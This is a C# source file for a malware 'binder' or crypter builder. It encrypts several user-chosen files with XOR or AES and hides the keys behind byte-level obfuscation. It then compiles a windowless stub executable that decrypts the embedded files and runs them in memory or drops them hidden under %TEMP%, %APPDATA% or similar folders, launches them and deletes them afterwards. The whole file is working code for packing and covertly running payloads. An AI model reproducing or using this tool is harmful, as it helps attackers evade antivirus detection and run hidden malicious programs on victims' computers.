using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Linq;

class Builder
{
    static void Main()
    {
        Console.Write("Number of files to embed: ");
        int fileCount;
        if (!int.TryParse(Console.ReadLine(), out fileCount) || fileCount < 1)
        {
            Console.WriteLine("Invalid number of files.");
            return;
        }

        string[] filePaths = new string[fileCount];
        for (int i = 0; i < fileCount; i++)
        {
            Console.Write($"File {i + 1} path: ");
            filePaths[i] = Console.ReadLine().Trim('"');

            if (!File.Exists(filePaths[i]))
            {
                Console.WriteLine($"File {i + 1} not found.");
                return;
            }
        }

        Console.WriteLine("\nChoose encryption method:");
        Console.WriteLine("1 - XOR (Simple)");
        Console.WriteLine("2 - AES (Strong)");
        Console.Write("Option (1-2): ");
        string encryptionChoice = Console.ReadLine().Trim();

        string encryptionMethod = encryptionChoice == "2" ? "AES" : "XOR";
        string key, iv = "";

        if (encryptionMethod == "AES")
        {
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.GenerateKey();
                aes.GenerateIV();
                key = Convert.ToBase64String(aes.Key);
                iv = Convert.ToBase64String(aes.IV);
            }
            Console.WriteLine($"\nGenerated AES Key: {key}");
            Console.WriteLine($"Generated AES IV: {iv}");
        }
        else
        {
            byte[] randomKey = new byte[32];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(randomKey);
            }
            key = Convert.ToBase64String(randomKey);
            Console.WriteLine($"\nGenerated XOR Key: {key}");
        }

        Console.WriteLine("\nShould the dropped files be hidden?");
        Console.WriteLine("1 - No (Visible)");
        Console.WriteLine("2 - Yes (Hidden)");
        Console.Write("Option (1-2): ");
        string hiddenChoice = Console.ReadLine().Trim();
        bool makeHidden = hiddenChoice == "2";

        Console.WriteLine("\nChoose drop path:");
        Console.WriteLine("1 - %TEMP%");
        Console.WriteLine("2 - %APPDATA%");
        Console.WriteLine("3 - %PROGRAMDATA%");
        Console.WriteLine("4 - %LOCALAPPDATA%");
        Console.WriteLine("5 - %USERPROFILE%");
        Console.WriteLine("6 - In-Memory Execution");
        Console.Write("Option (1-6): ");
        string dropChoice = Console.ReadLine().Trim();

        string dropPath;
        switch (dropChoice)
        {
            case "1": dropPath = "%TEMP%"; break;
            case "2": dropPath = "%APPDATA%"; break;
            case "3": dropPath = "%PROGRAMDATA%"; break;
            case "4": dropPath = "%LOCALAPPDATA%"; break;
            case "5": dropPath = "%USERPROFILE%"; break;
            case "6": dropPath = "MEMORY"; break;
            default: dropPath = "%TEMP%"; break;
        }

        Console.Write("\nSave compiled stub as (e.g., C:\\Users\\User\\Desktop\\output.exe): ");
        string outputPath = Console.ReadLine().Trim('"');

        // Ofuscar las claves
        string obfuscatedKey = ObfuscateString(key);
        string obfuscatedIv = ObfuscateString(iv);

        string stubCode = GetStubCode(dropPath, makeHidden, encryptionMethod, obfuscatedKey, obfuscatedIv);

        // Procesar los archivos
        string[] tempFiles = new string[fileCount];
        for (int i = 0; i < fileCount; i++)
        {
            string tempFile = Path.Combine(Path.GetTempPath(), Path.GetFileName(filePaths[i]));
            tempFiles[i] = tempFile;

            if (encryptionMethod == "AES")
            {
                EncryptFileAES(filePaths[i], tempFile, key, iv);
            }
            else
            {
                EncryptFileXOR(filePaths[i], tempFile, key);
            }
        }

        CompilerParameters parameters = new CompilerParameters
        {
            GenerateExecutable = true,
            OutputAssembly = outputPath,
            CompilerOptions = "/target:winexe /platform:x86",
            IncludeDebugInformation = false
        };

        parameters.ReferencedAssemblies.Add("System.dll");
        parameters.ReferencedAssemblies.Add("System.Core.dll");
        parameters.ReferencedAssemblies.Add("System.Security.dll");

        // Incluir los archivos cifrados como recursos incrustados
        foreach (string tempFile in tempFiles)
        {
            parameters.EmbeddedResources.Add(tempFile);
        }

        using (CSharpCodeProvider provider = new CSharpCodeProvider())
        {
            CompilerResults result = provider.CompileAssemblyFromSource(parameters, stubCode);

            if (result.Errors.HasErrors)
            {
                Console.WriteLine("\nCompilation failed:");
                foreach (CompilerError error in result.Errors)
                    Console.WriteLine($"- {error.ErrorText} (line {error.Line})");
            }
            else
            {
                Console.WriteLine($"\nStub created successfully at: {outputPath}");
                Console.WriteLine($"Encryption Method: {encryptionMethod}");
                Console.WriteLine($"Key: {key}");
                if (encryptionMethod == "AES") Console.WriteLine($"IV: {iv}");
            }
        }

        // Eliminar los archivos temporales
        foreach (string tempFile in tempFiles)
        {
            File.Delete(tempFile);
        }
    }

    static string ObfuscateString(string input)
    {
        if (string.IsNullOrEmpty(input)) return "string.Empty";

        byte[] bytes = Encoding.UTF8.GetBytes(input);
        StringBuilder sb = new StringBuilder();
        sb.Append("Encoding.UTF8.GetString(new byte[] { ");

        Random rand = new Random(input.GetHashCode());
        for (int i = 0; i < bytes.Length; i++)
        {
            int key1 = rand.Next(1, 255);
            int key2 = (i % 2 == 0) ? 0x55 : 0xAA;
            int obfuscated = bytes[i] ^ key1 ^ key2;
            sb.Append($"(byte)({obfuscated} ^ {key1} ^ {key2})");
            if (i < bytes.Length - 1) sb.Append(", ");
        }

        sb.Append(" })");
        return sb.ToString();
    }

    static void EncryptFileXOR(string inputPath, string outputPath, string key)
    {
        byte[] data = File.ReadAllBytes(inputPath);
        byte[] keyBytes = Convert.FromBase64String(key);

        for (int i = 0; i < data.Length; i++)
        {
            data[i] ^= keyBytes[i % keyBytes.Length];
        }

        File.WriteAllBytes(outputPath, data);
    }

    static void EncryptFileAES(string inputPath, string outputPath, string key, string iv)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = Convert.FromBase64String(key);
            aes.IV = Convert.FromBase64String(iv);
            aes.Padding = PaddingMode.PKCS7;
            aes.Mode = CipherMode.CBC;

            using (FileStream fsOutput = new FileStream(outputPath, FileMode.Create))
            using (ICryptoTransform encryptor = aes.CreateEncryptor())
            using (CryptoStream cs = new CryptoStream(fsOutput, encryptor, CryptoStreamMode.Write))
            {
                byte[] data = File.ReadAllBytes(inputPath);
                cs.Write(data, 0, data.Length);
            }
        }
    }

    static string GetStubCode(string dropPath, bool makeHidden, string encryptionMethod,
                            string obfuscatedKey, string obfuscatedIv)
    {
        return $@"
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Collections.Generic;
using System.Threading;
using System.Security.Cryptography;
using System.Text;

class Stub
{{
    static void Main()
    {{
        string mode = ""{dropPath}"";
        bool makeHidden = {makeHidden.ToString().ToLower()};
        string encryptionMethod = ""{encryptionMethod}"";

        // Claves ofuscadas (se reconstruyen en tiempo de ejecución)
        string key = {obfuscatedKey};
        string iv = {obfuscatedIv};

        string[] resources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
        List<Process> processes = new List<Process>();
        List<string> tempFiles = new List<string>();
        string tempFolder = Path.Combine(Environment.ExpandEnvironmentVariables(mode), ""BinderDrop"");

        foreach (string resName in resources)
        {{
            try
            {{
                using (Stream resStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resName))
                using (MemoryStream ms = new MemoryStream())
                {{
                    resStream.CopyTo(ms);
                    byte[] encryptedData = ms.ToArray();
                    byte[] rawAssembly;

                    if (encryptionMethod == ""AES"")
                    {{
                        using (Aes aes = Aes.Create())
                        {{
                            aes.Key = Convert.FromBase64String(key);
                            aes.IV = Convert.FromBase64String(iv);
                            aes.Padding = PaddingMode.PKCS7;
                            aes.Mode = CipherMode.CBC;

                            using (MemoryStream msDecrypt = new MemoryStream())
                            using (ICryptoTransform decryptor = aes.CreateDecryptor())
                            using (CryptoStream cs = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Write))
                            {{
                                cs.Write(encryptedData, 0, encryptedData.Length);
                                cs.FlushFinalBlock();
                                rawAssembly = msDecrypt.ToArray();
                            }}
                        }}
                    }}
                    else
                    {{
                        byte[] keyBytes = Convert.FromBase64String(key);
                        rawAssembly = new byte[encryptedData.Length];
                        for (int i = 0; i < encryptedData.Length; i++)
                        {{
                            rawAssembly[i] = (byte)(encryptedData[i] ^ keyBytes[i % keyBytes.Length]);
                        }}
                    }}

                    // Conservar el nombre original con su extensión
                    string originalName = resName;

                    if (mode == ""MEMORY"")
                    {{
                        Assembly asm = Assembly.Load(rawAssembly);
                        MethodInfo entry = asm.EntryPoint;
                        if (entry != null)
                        {{
                            object[] parameters = entry.GetParameters().Length == 0 ? null : new object[] {{ new string[0] }};
                            entry.Invoke(null, parameters);
                        }}
                    }}
                    else
                    {{
                        Directory.CreateDirectory(tempFolder);

                        if (makeHidden)
                            File.SetAttributes(tempFolder, File.GetAttributes(tempFolder) | FileAttributes.Hidden);

                        string fullPath = Path.Combine(tempFolder, originalName);

                        File.WriteAllBytes(fullPath, rawAssembly);
                        tempFiles.Add(fullPath);

                        if (makeHidden)
                            File.SetAttributes(fullPath, File.GetAttributes(fullPath) | FileAttributes.Hidden);

                        Process process = new Process();
                        process.StartInfo.FileName = fullPath;
                        process.StartInfo.UseShellExecute = true;
                        process.EnableRaisingEvents = true;
                        process.Exited += (sender, e) =>
                        {{
                            try
                            {{
                                if (File.Exists(fullPath))
                                    File.Delete(fullPath);
                            }}
                            catch {{ }}

                            try
                            {{
                                if (Directory.Exists(tempFolder) && Directory.GetFiles(tempFolder).Length == 0)
                                    Directory.Delete(tempFolder);
                            }}
                            catch {{ }}
                        }};
                        process.Start();
                        processes.Add(process);
                    }}
                }}
            }}
            catch (Exception ex)
            {{
                Console.WriteLine(""Error: "" + ex.Message);
            }}
        }}

        while (processes.Exists(p => !p.HasExited))
        {{
            Thread.Sleep(500);
        }}
    }}
}}";
    }
}
